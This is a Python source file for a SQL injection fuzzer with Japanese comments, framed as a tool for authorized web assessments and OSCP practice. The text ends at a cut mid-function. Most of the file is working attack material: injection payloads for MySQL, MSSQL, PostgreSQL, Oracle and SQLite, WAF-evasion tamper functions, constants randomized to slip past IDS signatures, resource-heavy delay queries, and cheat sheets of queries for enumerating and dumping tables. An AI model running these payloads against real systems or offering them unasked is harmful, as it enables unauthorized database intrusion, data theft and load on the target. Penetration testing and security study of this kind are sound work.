#!/usr/bin/env python3
# sqljr.py — SQL injection 注入点ファザー（Burp Intruder Sniper 風）
#
# 用途: 正式に許可された Web アプリ診断 / OSCP 演習のみ。所有 or 契約下の対象限定。
# 動作: 注入点（GET / POST / JSON / Cookie / ヘッダ / パス / * マーカー）に
#        error / boolean / time / union のペイロードを 1 点ずつ注入し、応答の差から
#        注入点・閉じ方（境界）・DBMS を特定する。
#        対応 DBMS: MySQL(MariaDB) / MSSQL / PostgreSQL / Oracle / SQLite
# 方針: 検出まで。データ抽出(dump)は自動では行わない。見つけた注入点については
#        「もしかして これが刺さるかも？」として次に手で打つコマンドを表示するだけ
#        （OSCP は自動エクスプロイトツール禁止。試験で使えるかは OffSec に要確認）。
# 安全: 既定(--risk 1)では OR 型を送らず、GET 以外では「後続の SQL を消す / 文を区切る」ペイロード
#        （-- - / # / ; / UNION / ORDER BY / WAITFOR）と素の AND も送らない（値の位置で中立な式だけ）。
#        UPDATE / DELETE に届くと狙った行以外に効くため。
#        参照系と分かっている POST（検索・ログイン）は --risk 2 で全ペイロードを送る。
#
# 使い方:
#   python3 sqljr.py -u "http://victim/item?id=1"
#   python3 sqljr.py -u "http://victim/item?id=1*"            # * の位置だけ狙う
#   python3 sqljr.py -u "http://victim/login" -d "user=a&pass=b" --risk 2   # ログインは OR 型が要る
#   python3 sqljr.py -u "http://victim/api" -d '{"id":1}'      # JSON ボディ
#   python3 sqljr.py -r req.txt --proxy http://127.0.0.1:8080  # Burp のリクエスト
#   python3 sqljr.py -u "http://victim/" -c "track=abc" --level 2   # Cookie も検査
#   python3 sqljr.py -u "http://victim/item?id=1" -t T --sleep 5    # time だけ
#   python3 sqljr.py -u "http://victim/item?id=1" -o result.json --log req.jsonl   # 結果と証跡を保存
import argparse
import copy
import html
import http.cookiejar
import datetime
import json
import random
import re
import shlex
import string
import sys
import time
from collections import Counter
from urllib.parse import urlsplit, quote, quote_plus, unquote_plus

try:
    import requests
except ImportError:
    sys.exit("[!] requests が必要です:  pip install requests")

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

# ── 色 ───────────────────────────────────────────────
G = "\033[32m"; Y = "\033[33m"; R = "\033[31m"; B = "\033[34m"; C = "\033[36m"; M = "\033[35m"; N = "\033[0m"

DBMS_LIST = ["MySQL", "MSSQL", "PostgreSQL", "Oracle", "SQLite"]
DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

# 実行のたびに変わる定数（固定値だと IDS のシグネチャ 1 本で全部落ちるため）
_RND = random.SystemRandom()
_word = lambda n: "".join(_RND.choice(string.ascii_lowercase) for _ in range(n))
NUMS = _RND.sample(range(11, 96), 5)            # boolean の比較に使う数字（確認のたびに別の数字を使う）
NUM_A, NUM_B = NUMS[0], NUMS[1]
TAG = _word(3)                                  # UNION の表示列を探す目印
ALIAS = _word(5)                                # サブクエリの別名
JUNK = _word(6)                                 # 元の行を返させないための値
WAF_STATUS = (403, 406, 429, 503)               # WAF / レート制限でよく返るステータス
MK = "\ue000"                                   # 内部マーカー。利用者が書いた * (--marker) は読み込み時にこれへ置き換える
                                                # （%2A のようにデコードして出てくる * をマーカーと取り違えないため）

# ── DBMS エラーのシグネチャ（上から順に評価。固有のものを先、Generic を最後）──
_F = re.IGNORECASE | re.DOTALL
ERROR_SIGNATURES = [(n, re.compile(rx, _F)) for n, rx in [
    ("MySQL",      r"SQL syntax.{0,120}?(MySQL|MariaDB)|check the manual that (corresponds to|fits) your (MySQL|MariaDB)"
                   r"|Warning(</b>)?:\s+mysqli?_\w+\(|MySqlException|valid MySQL result|com\.mysql\.jdbc|MySqlClient\."
                   r"|XPATH syntax error|Unknown column '[^']*' in|MySQLSyntaxErrorException|pymysql\.err|mysql\.connector\.errors"
                   r"|Subquery returns more than 1 row|The used SELECT statements have a different number of columns"
                   r"|Truncated incorrect \w+ value|BIGINT value is out of range in|FUNCTION [\w.]+ does not exist"),
    ("MSSQL",      r"Microsoft SQL (Server|Native)|ODBC (SQL Server|Driver \d+ for SQL Server)|Unclosed quotation mark"
                   r"|SQLServer JDBC|OLE DB.{0,80}?SQL Server|Incorrect syntax near|Conversion failed when converting"
                   r"|System\.Data\.SqlClient|com\.microsoft\.sqlserver|\[SQL Server\]|Msg \d+, Level \d+, State|pymssql\.|pyodbc\."
                   r"|Subquery returned more than 1 value|Divide by zero error encountered|Invalid (column|object) name '"
                   r"|All queries combined using a UNION|ORDER BY position number \d+ is out of range"),
    ("PostgreSQL", r"PostgreSQL[^<]{0,80}?(?-i:ERROR):|pg_(query|exec|prepare|send_query)\(\)|PSQLException|org\.postgresql\.util"
                   r"|syntax error at (or near|end of input)|unterminated quoted (string|identifier) at or near"
                   r"|invalid input syntax for|psycopg2?\.(errors|Error|ProgrammingError)|Npgsql\.|PG::SyntaxError"
                   r"|ERROR:\s+(column|relation|operator|function) .{0,80}? does not exist"
                   r"|more than one row returned by a subquery used as an expression"
                   r"|each UNION query must have the same number of columns|ORDER BY position \d+ is not in select list"),
    ("Oracle",     r"ORA-[0-9]{4,5}|DPY-[0-9]{4}|oracledb\.exceptions|Oracle error|quoted string not properly terminated|oracle\.jdbc|OracleException"
                   r"|Warning(</b>)?:\s+oci_\w+\("),
    ("SQLite",     r"SQLite/JDBCDriver|sqlite3?\.(OperationalError|ProgrammingError)|SQLITE_ERROR|SQLite3::(SQLException|query)"
                   r"|unrecognized token:|SQL logic error|near \".{0,80}?\": syntax error|Warning(</b>)?:\s+sqlite_\w+\("
                   r"|System\.Data\.SQLite|no such (column|function|table): |incomplete input"
                   r"|SELECTs to the left and right of UNION|ORDER BY term out of range|integer overflow"),
    # Generic は「SQL 由来とは限らない」文言。これだけでは確定扱いにしない
    ("Generic",    r"SQL syntax|syntax error|unterminated (quoted )?string|SQLSTATE\[|quoted string|SQLException"
                   r"|PDOException|ODBC.{0,40}?Driver|\bdatabase error\b|\bDB Error\b"),
]]

# ── 1) error-based: 構文を壊してエラーを誘発する ──
ERROR_PROBES = ["'", "\"", "`", "\\", "')", "\")", "'\"", "';", "'))"]
# ';' は文の区切り。複数文を実行する実装（PHP の PDO / SQLite3::exec 等）では UPDATE ... SET x='v'; で文が終わり
# WHERE が外れるので、コメントと同じ扱いにする（allow_comment() が偽なら送らない）
ERROR_PROBES_CUT = ("';",)

# ── 境界（閉じ方）: (接頭辞, 接尾辞)。中身（AND 1=1 / SLEEP 等）と掛け合わせて使う ──
# コメントを使わない（後続の SQL を消さない）ものを先に試す。
BOUNDARIES = [
    ("",    ""),                     # 数値コンテキスト
    ("'",   " AND 'a'='a"),          # クォートで閉じ直す
    ("\"",  " AND \"a\"=\"a"),
    (")",   " AND (7=7"),
    ("')",  " AND ('a'='a"),
    ("'",   "-- -"),
    ("\"",  "-- -"),
    ("",    "-- -"),
    (")",   "-- -"),
    ("')",  "-- -"),
    ("\")", "-- -"),
    ("'))", "-- -"),
    ("))",  "-- -"),
    ("'",   "#"),                    # MySQL の # コメント
    ("",    "#"),
]
# 式コンテキスト（コメントで後ろを消せない / WHERE 句ではない場所）用の境界。op は空。
# 条件が真なら「値を変えない」式になり、偽のときだけ SQL エラーになる式を差し込む。
#   num: 数値の位置（WHERE id=<値> / IN (<値>) / 関数の引数 / VALUES の数値） … <値>-(0)
#   str: 文字列の中（WHERE name='<値>' / INSERT・UPDATE の文字列値）          … '<値>'||''
#   lst: 並びの後ろ（ORDER BY / GROUP BY / IN の並び）                         … <値>,(NULL)
# 真のときに 1 や 'a' を返す形にすると、IN (...) に別の ID が増えたり別の行を指したりするので 0 / '' / NULL に限る。
# 偽の側は「複数行を返す副問い合わせ」。SQLite はこれをエラーにしない（先頭行を使う）ので、
# 先頭行も 0 / '' / NULL になる UNION ALL にし、SQLite には整数オーバーフローを使う専用の形を別に持つ。
#
# 文字列の連結（|| / +）は DBMS ごとに意味が違う。MySQL では || が OR、+ が加算なので、連結のつもりの式が
#   WHERE name='v'||(…)||'' AND owner=7  →  (name='v') OR (…) OR ('' AND owner=7)
# となり、後ろの条件が外れて他人の行に一致する。そこで連結形にはその DBMS にしか無い関数・変数
#（pg_backend_pid / sqlite_version / ORA_HASH / @@SPID）を入れ、ほかの DBMS では実行前のエラーで止まるようにしてある。
# 最後の要素は「GET 以外・--risk 1 でも送ってよいか」。
EXPR_BOUNDS = [    # (対象 DBMS, 種別, 接頭辞, 接尾辞, 安全か)。対象 None は MySQL / PostgreSQL / MSSQL / Oracle 23 共通
    (None,         "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 UNION ALL SELECT 0) END)", True),
    ("PostgreSQL", "str", "'||(SELECT CASE WHEN pg_backend_pid()>0 AND (",
                          ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)||'", True),
    # MySQL 用（下の MYSQL_STR_BOUNDS の「括弧を閉じない」形）。GET 以外・--risk 1 では深い括弧から順に試すので、ここでは外す
    ("MySQL",      "str", "'=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND (CASE WHEN (",
                          ") THEN 1 ELSE (SELECT 1 UNION ALL SELECT 1) END)=1) AND 'a'='a", False),
    (None,         "lst", ",(SELECT CASE WHEN (", ") THEN NULL ELSE (SELECT 0 UNION ALL SELECT 0) END)", True),
    ("MSSQL",      "str", "'+(SELECT CASE WHEN @@SPID>0 AND (", ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)+'", True),
    ("SQLite",     "num", "-(CASE WHEN (", ") THEN 0 ELSE abs(-9223372036854775808) END)", True),
    ("SQLite",     "str", "'||(CASE WHEN sqlite_version()>'' AND (", ") THEN '' ELSE abs(-9223372036854775808) END)||'", True),
    ("SQLite",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE abs(-9223372036854775808) END)", True),
    ("Oracle",     "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)", True),
    ("Oracle",     "str", "'||(SELECT CASE WHEN ORA_HASH('a')>=0 AND (",
                          ") THEN NULL ELSE (SELECT 'a' FROM DUAL UNION ALL SELECT 'a' FROM DUAL) END FROM DUAL)||'", True),
    ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)", True),
    ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE 1/0 END)", True),      # GROUP BY（副問い合わせが書けない）用
]
# MySQL / MariaDB の文字列用。MySQL には文字列の位置で「値を変えない式」が無い（|| は OR、+ は加算）ので、
# クォートを閉じたあと「比較の結果」に副問い合わせをつなぐ:
#   WHERE name='v'=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND <条件>) AND 'a'='a' AND owner=7
#     → ((name='v') = '1') AND 'a'='a' AND owner=7
#   条件が真なら副問い合わせは '1' → 元の比較と同じ（後ろの条件もそのまま残る）。偽なら NULL → 0 行。
# ・AND でつなぐ形と違い、MySQL 8 でも左辺が偽の行で評価が省かれない。'1' を文字列にしてあるので、INSERT / UPDATE の
#   値の中（'v'='1'）でも数値変換のエラーにならず、遅延まで進む。
# ・boolean では <条件> を「偽なら複数行の副問い合わせでエラー」にする。エラーにする部分を WHERE の内側に置くのは、
#   DELETE IGNORE / UPDATE IGNORE がエラーを握り潰しても「元と同じ」か「0 行」にしかならないようにするため
#  （比較の右辺に直接置くと、握り潰されたとき 0 になって一致が反転する）。
# ・@@sql_mode を入れてあるので、ほかの DBMS では実行前にエラーになる。
# 値が括弧の中（IN ('v') / LOWER('v') / ('v')）にあると、この式は「値」の一部になって別の行に効く。
# 括弧を多く閉じすぎた形は構文エラーで止まる（無害）ので、深い方から順に試し、構文として通った深さで打ち切る
#（それより浅い形は送らない）。対応するのは括弧 2 重まで。
def _mysql_str(q, depth):
    return (q + ")" * depth + "=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND ",
            ") AND " + "(" * depth + "%sa%s=%sa" % (q, q, q))


def _mysql_and(q, depth):
    return (q + ")" * depth + " AND @@sql_mode IS NOT NULL AND ", " AND " + "(" * depth + "%sa%s=%sa" % (q, q, q))


_MYSQL_DEPTHS = [(q, depth) for q in ("'", "\"") for depth in (2, 1, 0)]
# boolean 用: (接頭辞, 接尾辞)。条件が偽なら副問い合わせが複数行になり SQL エラー
MYSQL_STR_BOUNDS = [(_mysql_str(q, d)[0] + "(CASE WHEN (",
                     ") THEN 1 ELSE (SELECT 1 UNION ALL SELECT 1) END)=1" + _mysql_str(q, d)[1]) for q, d in _MYSQL_DEPTHS]
# time 用。前半は上と同じ形。後半は定数の AND: MySQL 8 は、ほかの条件で行が 1 つも残らないとき（ログインフォームの
# パスワード側など）前半の式を評価しないが、表に依存しない AND の項は先に 1 回評価する。INSERT / UPDATE の値の中では
# 逆に前半しか遅延しない。
MYSQL_STR_TIME_BOUNDS = [_mysql_str(q, d) for q, d in _MYSQL_DEPTHS] + [_mysql_and(q, d) for q, d in _MYSQL_DEPTHS]
# 接頭辞 → (クォート, 括弧の深さ)。「この深さで構文が通った」と分かったら、同じクォートのそれより浅い形は送らない
MYSQL_DEPTH = dict((b[0], qd) for bs in (MYSQL_STR_BOUNDS, MYSQL_STR_TIME_BOUNDS)
                   for b, qd in zip(bs, _MYSQL_DEPTHS + _MYSQL_DEPTHS))
# time 用の式コンテキスト境界（連結・演算・並びに埋め込む）。中身は各 DBMS の遅延式。
# 遅延したあとの値は 0 / '' / NULL（元の値を変えない）。MySQL の文字列だけは上と同じ理由で「比較の結果」につなぐ形。
# ほかの DBMS の連結形は、中の遅延式（PG_SLEEP / DBMS_PIPE / sqlite_version 入りの重い処理）が MySQL では実行前にエラーになる。
TIME_EXPR_BOUNDS = {
    # 文字列は深い括弧から順（MYSQL_STR_TIME_BOUNDS）。遅延したら構文として通った証拠なので、それより浅い形は送らない
    "MySQL":      MYSQL_STR_TIME_BOUNDS
                  + [("-(SELECT 0 FROM DUAL WHERE ", ")"), (",(SELECT NULL FROM DUAL WHERE ", ")")],
    "PostgreSQL": [("'||(SELECT '' WHERE ", ")||'"), ("-(SELECT 0 WHERE ", ")"), (",(SELECT NULL WHERE ", ")")],
    "Oracle":     [("'||(SELECT NULL FROM DUAL WHERE ", ")||'"), ("-(SELECT 0 FROM DUAL WHERE ", ")"),
                   (",(SELECT NULL FROM DUAL WHERE ", ")")],
    "SQLite":     [("'||(SELECT '' WHERE ", ")||'"), ("-(SELECT 0 WHERE ", ")"), (",(SELECT NULL WHERE ", ")")],
}

# time / union で境界が未確定のときに試す接頭辞（多い順）
QUICK_PREFIXES = ["'", "", "\"", "')", ")", "\")"]

# ── DBMS 指紋: その DBMS でだけ「真」になる式（boolean で境界が取れた後に使う）──
FINGERPRINTS = [
    ("MySQL",      "CONNECTION_ID()=CONNECTION_ID()"),
    ("MSSQL",      "BINARY_CHECKSUM(1)=BINARY_CHECKSUM(1)"),
    ("PostgreSQL", "5::int=5"),
    ("Oracle",     "LENGTH(SYSDATE)=LENGTH(SYSDATE)"),
    ("SQLite",     "sqlite_version()=sqlite_version()"),
]

# ── 3) time-based の中身。inline は「{op} 式」、stack はスタッククエリ ──
#      {t}=秒, {hms}=h:m:s。t=0 を対照（遅延しないはず）として使う。
#      どれも副問い合わせに包み、行数ぶん遅延しない形にしてある（1 文につき 1 回）。
TIME_CORES = {
    "MySQL":      [("inline", "1=(SELECT 1 FROM (SELECT SLEEP({t})){al})")],
    "MSSQL":      [("stack",  ";WAITFOR DELAY '{hms}'"),
                   ("stack",  " WAITFOR DELAY '{hms}'")],
    "PostgreSQL": [("inline", "1=(SELECT 1 FROM PG_SLEEP({t}))"),
                   ("stack",  ";SELECT PG_SLEEP({t})")],
    "Oracle":     [("inline", "1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),{t}) FROM DUAL)")],
}
# sleep が無い（SQLite）/ 権限が無くて使えない（Oracle の DBMS_PIPE は一般ユーザに EXECUTE 権限が無い）とき用の
# 「重い処理」。値は必ず 1 になる式で、{n} が大きいほど時間が掛かる。n=1 を対照にし、小さい方から段階的に上げる。
#   (式, 既定で試す n, --risk 2 で追加する (式, n))
_ORA_J = "ALL_USERS A,ALL_USERS B,ALL_USERS C,ALL_USERS D,ALL_USERS E,ALL_USERS F"
# sqlite_version() を入れて SQLite 以外ではエラーにする（WITH RECURSIVE は MariaDB / PostgreSQL でも動き、
# MariaDB では '||(…)||' が OR になるため）
_SQLITE_CTE = ("(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{n}) "
               "SELECT 1+0*COUNT(*) FROM c WHERE sqlite_version()>'')")
_SQLITE_BLOB = "(SELECT 1+LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({n})))))"
HEAVY = {
    # 再帰 CTE で数えるだけ（CPU のみ・メモリは増えない）。SQLite 3.8.3 未満は WITH RECURSIVE が無いので、
    # --risk 2 のときだけ RANDOMBLOB（100MB で対象のメモリを約 700MB 使う）も試す
    "SQLite": [(_SQLITE_CTE, 3000000), (_SQLITE_CTE, 20000000)],
    "Oracle": [("(SELECT 1+0*COUNT(*) FROM " + _ORA_J + " WHERE ROWNUM<={n})", 30000000),
               ("(SELECT 1+0*COUNT(*) FROM " + _ORA_J + " WHERE ROWNUM<={n})", 150000000)],
}
HEAVY_RISK2 = {
    "SQLite": [(_SQLITE_BLOB, 20000000), (_SQLITE_BLOB, 100000000)],
}

# ── 見つけた後に提示するコマンド用の DBMS 別チートシート ──
INFO = {
    "MySQL": dict(
        ver="SELECT @@version", user="SELECT user()", db="SELECT database()",
        tables="SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
        cols="SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() "
             "AND table_name='<TABLE>'",
        dump="SELECT group_concat(<COL1>,0x3a,<COL2>) FROM <TABLE>",
        agg_note="（group_concat は既定 1024 バイトで切れる）",
        one="SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT <N>,1",
        err=[("（extractvalue は 32 文字で切れる）", "extractvalue(1,concat(0x7e,({q}),0x7e))")],
        chr="ASCII(SUBSTRING(({q}),1,1))",
        # 派生テーブルに入れる: 1 文につき 1 回だけ、行の評価より前に実行される（INSERT / UPDATE の値の中でも遅延する）
        timeb=("inline", "1=(SELECT 1 FROM (SELECT IF(({cond}),SLEEP({t}),0)){al})")),
    "MSSQL": dict(
        ver="SELECT @@version", user="SELECT SYSTEM_USER", db="SELECT DB_NAME()",
        tables="SELECT STRING_AGG(CAST(name AS nvarchar(max)),',') FROM sys.tables",
        cols="SELECT STRING_AGG(CAST(name AS nvarchar(max)),',') FROM sys.columns WHERE object_id=OBJECT_ID('<TABLE>')",
        dump="SELECT STRING_AGG(CAST(CONCAT(<COL1>,':',<COL2>) AS nvarchar(max)),',') FROM <TABLE>",
        agg_note="（STRING_AGG は SQL Server 2017 以降。古ければ 1 件ずつ。nvarchar(max) に CAST しないと 8000 バイトでエラー）",
        one="SELECT name FROM sys.tables ORDER BY name OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY",
        err=[("", "1=CONVERT(int,({q}))")],
        chr="ASCII(SUBSTRING(({q}),1,1))",
        timeb=("stack", ";IF(({cond})) WAITFOR DELAY '{hms}'")),
    "PostgreSQL": dict(
        ver="SELECT version()", user="SELECT current_user", db="SELECT current_database()",
        tables="SELECT string_agg(table_name,',') FROM information_schema.tables "
               "WHERE table_schema NOT IN ('pg_catalog','information_schema')",
        cols="SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_schema NOT IN "
             "('pg_catalog','information_schema') AND table_name='<TABLE>'",
        dump="SELECT string_agg(<COL1>||':'||<COL2>,',') FROM <TABLE>",
        one="SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN "
            "('pg_catalog','information_schema') LIMIT 1 OFFSET <N>",
        err=[("", "1=CAST(({q}) AS int)")],
        chr="ASCII(SUBSTR(({q}),1,1))",
        timeb=("inline", "1=(CASE WHEN ({cond}) THEN (SELECT 1 FROM PG_SLEEP({t})) ELSE 1 END)")),
    "Oracle": dict(
        ver="SELECT banner FROM v$version WHERE ROWNUM=1", user="SELECT user FROM dual",
        db="SELECT global_name FROM global_name",
        tables="SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables",
        cols="SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns "
             "WHERE table_name=UPPER('<TABLE>')",
        dump="SELECT LISTAGG(<COL1>||':'||<COL2>,',') WITHIN GROUP (ORDER BY 1) FROM <TABLE>",
        agg_note="（LISTAGG は 4000 バイトを超えるとエラー）",
        one="SELECT table_name FROM (SELECT table_name, ROWNUM r FROM user_tables) WHERE r=<N>+1",
        # CTXSYS.DRITHSX.SN は Oracle Text（任意コンポーネント）が無いと使えないので、標準パッケージの方を先に出す
        err=[("", "1=DBMS_UTILITY.SQLID_TO_SQLHASH(({q}))"),
             ("（Oracle Text がある環境向けの別形）", "1=CTXSYS.DRITHSX.SN(1,({q}))")],
        chr="ASCII(SUBSTR(({q}),1,1))",
        timeb=("inline", "1=(SELECT CASE WHEN ({cond}) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),{t}) ELSE 1 END FROM DUAL)")),
    "SQLite": dict(
        ver="SELECT sqlite_version()", user="SELECT 'sqlite(ユーザ概念なし)'", db="SELECT file FROM pragma_database_list",
        tables="SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
        cols="SELECT sql FROM sqlite_master WHERE name='<TABLE>'",
        dump="SELECT group_concat(<COL1>||':'||<COL2>) FROM <TABLE>",
        err=[],
        chr="UNICODE(SUBSTR(({q}),1,1))",
        timeb=None),            # sleep が無い。検出に使った「重い処理」をそのまま使う（HEAVY_TIMEB）
}


# 「重い処理」で検出したときの time blind。{heavy} は検出に使った式（値は 1）
HEAVY_TIMEB = "1=(CASE WHEN ({cond}) THEN {heavy} ELSE 1 END)"


# ── 設定（main で上書き）──
class CFG:
    sleep = 5
    timeout = 20
    marker = "*"
    delay = 0.0
    retries = 1
    risk = 1
    level = 1
    dbms = None
    string = None
    tamper = []
    verbose = False
    count = 0
    blocked = 0         # WAF / レート制限らしき応答の数
    cookie_note = False # 「Set-Cookie は保持しない」の注意を出したか
    log = None          # --log: 全リクエストを JSONL で残す


SESSION = None
T = None            # 対象リクエストのテンプレート（Target）


# ── tamper（WAF / フィルタ回避用の最低限の変形）──
_KW = re.compile(r"\b(SELECT|UNION|ALL|AND|OR|ORDER|BY|FROM|WHERE|NULL|SLEEP|WAITFOR|DELAY|CASE|WHEN|THEN|ELSE|END"
                 r"|LIKE|CONCAT|IF)\b", re.IGNORECASE)


def _t_space2comment(p):
    tail = ""
    if p.endswith("-- -"):          # 末尾のコメントは空白が必要なので残す
        p, tail = p[:-4], "-- -"
    # '...' の中（コマンド文字列やファイルパス）の空白は変えない
    lit = _literal_spans(p)
    return "".join("/**/" if (ch == " " and not lit[i]) else ch for i, ch in enumerate(p)) + tail


def _literal_spans(p):
    """p の各文字が「ペイロード内で開いて閉じた '...' の中」にあるかどうか。
       注入値は多くの場合 ' で始まり（元の文字列を閉じる）、対になる ' が無いこともあるので、
       閉じクォートが見つかった区間だけを文字列リテラルとして扱う。"""
    inside = [False] * len(p)
    start = 1 if p[:1] in ("'", '"') else 0      # 先頭のクォートは元の値を閉じるためのもの
    i = start
    while i < len(p):
        if p[i] == "'":
            j = p.find("'", i + 1)
            if j < 0:
                break
            for k in range(i + 1, j):
                inside[k] = True
            i = j + 1
        else:
            i += 1
    return inside


def _t_randomcase(p):
    return _KW.sub(lambda m: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())), p)


TAMPERS = {
    "space2comment": _t_space2comment,
    "randomcase": _t_randomcase,
    "doubleurl": lambda p: quote(p, safe=""),       # 二重 URL エンコード
}


def tamper(payload):
    for name in CFG.tamper:
        payload = TAMPERS[name](payload)
    return payload


# ── 対象リクエスト ───────────────────────────────────
class Target:
    def __init__(self):
        self.method = "GET"
        self.url = ""           # scheme://host/path（クエリ無し。path に内部マーカーを含み得る）
        self.query = []         # [(k, v)]（% デコード済み）
        self.query_raw = []     # 元の「k=v」断片。触らないパラメータはこれをそのまま送る（None = 作り直す）
        self.kind = None        # None / "form" / "json" / "raw"
        self.form = []          # [(k, v)]
        self.form_raw = []
        self.json = None
        self.raw = None
        self.headers = {}
        self.cookies = []       # [(k, v)]
        self.marker_mode = False


def has_header(headers, name):
    return any(k.lower() == name.lower() for k in headers)


def set_header(headers, name, value):
    """同じ名前（大文字小文字違い）のヘッダは 1 つだけにする。後から来た方が勝つ。"""
    for k in [k for k in headers if k.lower() == name.lower()]:
        del headers[k]
    headers[name] = value


def mark(s):
    """利用者が書いたマーカー（既定 *）を内部マーカーに置き換える。"""
    return s.replace(CFG.marker, MK) if s else s


def cl(s):
    """内部マーカーを取り除く（注入しない箇所をそのまま送るとき）。"""
    return s.replace(MK, "")


def parse_cookie(s):
    out = []
    for part in s.split(";"):
        if "=" in part:
            k, _, v = part.partition("=")
            out.append((k.strip(), v.strip()))      # デコードしない（base64 等を壊さない）
    return out


def parse_pairs(raw):
    """a=1&b=2 形式を [(k, v)] と元の断片のリストに分ける。
       % デコードの前にマーカーを置き換えるので、%2A（データとしての *）はマーカーにならない。
       UTF-8 として読めないバイト列（Shift_JIS 等）は surrogateescape で保持し、送るときに元のバイトへ戻す。"""
    pairs, segs = [], []
    for seg in raw.split("&"):
        if not seg:
            continue
        k, _, v = seg.partition("=")
        dec = lambda x: unquote_plus(mark(x), errors="surrogateescape")
        pairs.append((dec(k), dec(v)))
        segs.append(None if CFG.marker in seg else seg)
    return pairs, segs


def enc_pair(k, v):
    return quote_plus(k, errors="surrogateescape") + "=" + quote_plus(v, errors="surrogateescape")


def join_pairs(pairs, raws, target, val):
    """target 番目だけ val に差し替え、ほかは元の断片のまま（無ければ作り直して）つなぐ。"""
    out = []
    for i, (k, v) in enumerate(pairs):
        raw = raws[i] if i < len(raws) else None
        if i == target:
            out.append(enc_pair(cl(k), val))
        elif raw is not None:
            out.append(raw)
        else:
            out.append(enc_pair(cl(k), cl(v)))
    return "&".join(out)


def parse_request_file(path, https):
    """Burp の「Copy to file」形式の生リクエストを読む。ボディは改行も含めてそのまま保つ（multipart 用）。"""
    with open(path, "rb") as f:
        data = f.read().lstrip(b"\r\n")
    cut = [(data.find(sep), len(sep)) for sep in (b"\r\n\r\n", b"\n\n") if data.find(sep) >= 0]
    if cut:
        pos, n = min(cut)
        head, body = data[:pos], data[pos + n:]
    else:
        head, body = data, b""
    lines = [l for l in head.decode("utf-8", "replace").replace("\r\n", "\n").split("\n") if l.strip()]
    try:
        method, target = lines[0].split()[:2]
    except (IndexError, ValueError):
        sys.exit("[!] リクエストファイルの 1 行目が読めません: %s" % path)
    headers, host, cookie = {}, "", None
    for l in lines[1:]:
        k, _, v = l.partition(":")
        k, v = k.strip(), v.strip()
        lk = k.lower()
        if lk == "host":
            host = v
        elif lk == "cookie":
            cookie = v
        elif lk not in ("content-length", "connection", "accept-encoding"):
            set_header(headers, k, v)
    url = target if target.startswith("http") else "%s://%s%s" % ("https" if https else "http", host, target)
    body = body.decode("utf-8", "surrogateescape")
    ctype = next((v for k, v in headers.items() if k.lower() == "content-type"), "").lower()
    if "multipart" not in ctype:
        body = body.rstrip("\r\n")              # エディタが足した末尾の改行は落とす
    return method.upper(), url, headers, cookie, (body if body else None)


def looks_form(body):
    """a=1&b=2 の形に見えるか（XML や JSON を '=' があるだけでフォーム扱いしないため）。"""
    b = body.strip()
    if not b or "=" not in b or b[:1] in "<{[" or re.search(r"[\r\n]", b):
        return False
    return all(re.fullmatch(r"[^=\s\"<>{}]+(=.*)?", seg) for seg in b.split("&") if seg)


def build_target(args):
    t = Target()
    method, url, headers, cookie, body = None, args.url, {}, args.cookie, args.data
    if args.request:
        method, url, headers, c2, b2 = parse_request_file(args.request, args.https)
        cookie = cookie or c2
        body = body if body is not None else b2
    if not url:
        sys.exit("[!] -u か -r で対象を指定してください。")
    if "://" not in url:
        url = "http://" + url
    for h in args.header or []:
        k, _, v = h.partition(":")
        if k.strip().lower() == "cookie":
            cookie = cookie or v.strip()
        else:
            set_header(headers, k.strip(), v.strip())
    if not has_header(headers, "User-Agent"):
        headers["User-Agent"] = DEFAULT_UA
    for k in list(headers):                     # Accept: */* などはマーカー扱いしない
        if not (k.lower().startswith("accept") or k.lower() == "content-type"):
            headers[k] = mark(headers[k])
    pr = urlsplit(url)                          # urlsplit は ;jsessionid=... をパスに残す
    t.url = "%s://%s%s" % (pr.scheme, pr.netloc, mark(pr.path) or "/")
    t.query, t.query_raw = parse_pairs(pr.query)
    t.headers = headers
    t.cookies = parse_cookie(mark(cookie)) if cookie else []

    if body is not None:
        ctype = next((v for k, v in headers.items() if k.lower() == "content-type"), "").lower()
        looks_json = body.lstrip()[:1] in ("{", "[")
        obj = None
        if "json" in ctype or looks_json:
            try:
                obj = json_keys(json.loads(mark(body)))
            except ValueError:
                obj = None
        if obj is not None and isinstance(obj, (dict, list)):
            t.kind, t.json = "json", obj
            if not ctype:
                t.headers["Content-Type"] = "application/json"
        elif "x-www-form-urlencoded" in ctype or (not ctype and looks_form(body)):
            t.kind = "form"
            t.form, t.form_raw = parse_pairs(body)
            if not ctype:
                t.headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            t.kind, t.raw = "raw", mark(body)   # マーカー(*)を置いた箇所だけ検査できる
            if not ctype:                       # curl は勝手に form の Content-Type を付けるので、こちらで決めておく
                if looks_json:
                    t.headers["Content-Type"] = "application/json"
                elif body.lstrip()[:1] == "<":
                    t.headers["Content-Type"] = "application/xml"
